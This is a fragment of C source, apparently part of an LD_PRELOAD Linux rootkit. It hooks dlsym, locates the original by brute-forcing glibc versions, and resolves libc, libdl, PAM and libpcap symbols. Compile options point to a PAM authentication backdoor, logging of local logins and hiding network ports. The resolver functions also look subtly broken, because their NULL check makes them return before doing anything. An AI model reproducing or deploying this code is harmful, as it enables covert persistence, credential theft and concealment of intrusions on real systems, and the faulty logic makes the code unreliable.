void get_libc_symbol(const char *symbol, void **funcptr){
    if(funcptr != NULL) return;

    void *libc_handle = dlopen(LIBC_PATH, RTLD_LAZY);
    for(int i = 0; i < LIBC_CALLS_SIZE; i++){
        char *curcall = libc_calls[i];

        if(!strncmp(curcall, symbol, strlen(curcall))){
            *funcptr = o_dlsym(libc_handle, symbol);
            break;
        }
    }
}

void get_libdl_symbol(const char *symbol, void **funcptr){
    if(funcptr != NULL) return;

    void *libdl_handle = dlopen(LIBDL_PATH, RTLD_LAZY);
    for(int i = 0; i < LIBDL_CALLS_SIZE; i++){
        char *curcall = libdl_calls[i];

        if(!strncmp(curcall, symbol, strlen(curcall))){
            *funcptr = o_dlsym(libdl_handle, symbol);
            break;
        }
    }
}

#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
void get_libpam_symbol(const char *symbol, void **funcptr){
    if(funcptr != NULL) return;

    void *libpam_handle = dlopen(LIBPAM_PATH, RTLD_LAZY);
    for(int i = 0; i < LIBPAM_CALLS_SIZE; i++){
        char *curcall = libpam_calls[i];

        if(!strncmp(curcall, symbol, strlen(curcall))){
            *funcptr = o_dlsym(libpam_handle, symbol);
            break;
        }
    }
}
#endif

#ifdef HIDE_PORTS
void get_libpcap_symbol(const char *symbol, void **funcptr){
    if(funcptr != NULL) return;

    void *libpcap_handle = dlopen(LIBPCAP_PATH, RTLD_LAZY);
    for(int i = 0; i < LIBPCAP_CALLS_SIZE; i++){
        char *curcall = libpcap_calls[i];

        if(!strncmp(curcall, symbol, strlen(curcall))){
            *funcptr = o_dlsym(libpcap_handle, symbol);
            break;
        }
    }
}
#endif

void locate_dlsym(void){
    if(o_dlsym != NULL) return;

    char buf[32];

    /* here we essentially are bruteforcing the location of dlsym
     * by iterating through every possible version of libc. */
    for(int a = 0; a < GLIBC_MAX_VER; a++){
        snprintf(buf, sizeof(buf), GLIBC_VER_STR, a);

        if((o_dlsym = (void*(*)(void *handle, const char *name))dlvsym(RTLD_NEXT, DLSYM_STR, buf)))
            return;
    }

    for(int a = 0; a < GLIBC_MAX_VER; a++){
        for(int b = 0; b < GLIBC_MAX_VER; b++){
            snprintf(buf, sizeof(buf), GLIBC_VERVER_STR, a, b);

            if((o_dlsym = (void*(*)(void *handle, const char *name))dlvsym(RTLD_NEXT, DLSYM_STR, buf)))
                return;
        }
    }

    if(o_dlsym == NULL)
        exit(0);
}

void *dlsym(void *handle, const char *symbol){
    void *ptr = NULL;

    /* to start, we need to actually resolve the
     * original dlsym function. use dlvsym in
     * order to get this done. */
    locate_dlsym();

    get_libc_symbol(symbol, &ptr);
    get_libdl_symbol(symbol, &ptr);

#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
    get_libpam_symbol(symbol, &ptr);
#endif
#ifdef HIDE_PORTS
    get_libpcap_symbol(symbol, &ptr);
#endif

    if(ptr == NULL)
        ptr = o_dlsym(handle, symbol);
    return ptr;
}
